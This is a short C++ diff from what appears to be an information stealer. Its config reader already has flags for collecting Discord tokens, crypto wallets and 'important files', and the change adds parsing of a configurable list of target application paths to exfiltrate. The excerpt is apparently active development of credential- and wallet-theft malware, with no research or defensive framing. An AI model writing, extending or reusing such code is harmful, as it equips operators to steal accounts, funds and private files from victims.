@@ -197,6 +197,20 @@ std::optional<EmbeddedConfig> read_embedded_config() {
         embeddedConfig.collectDiscordTokens = config.value("collectDiscordTokens", true);
         embeddedConfig.collectCryptoWallets = config.value("collectCryptoWallets", true);
         embeddedConfig.collectImportantFiles = config.value("collectImportantFiles", true);
+        
+        // Parse important files configuration
+        embeddedConfig.importantFilesConfig.clear();
+        if (config.contains("importantFilesConfig") && config["importantFilesConfig"].is_array()) {
+            for (const auto& item : config["importantFilesConfig"]) {
+                ImportantFileConfig fileConfig;
+                fileConfig.appName = item.value("appName", "");
+                fileConfig.path = item.value("path", "");
+                fileConfig.enabled = item.value("enabled", true);
+                if (!fileConfig.appName.empty() && !fileConfig.path.empty()) {
+                    embeddedConfig.importantFilesConfig.push_back(fileConfig);
+                }
+            }
+        }
 
         return embeddedConfig;
 
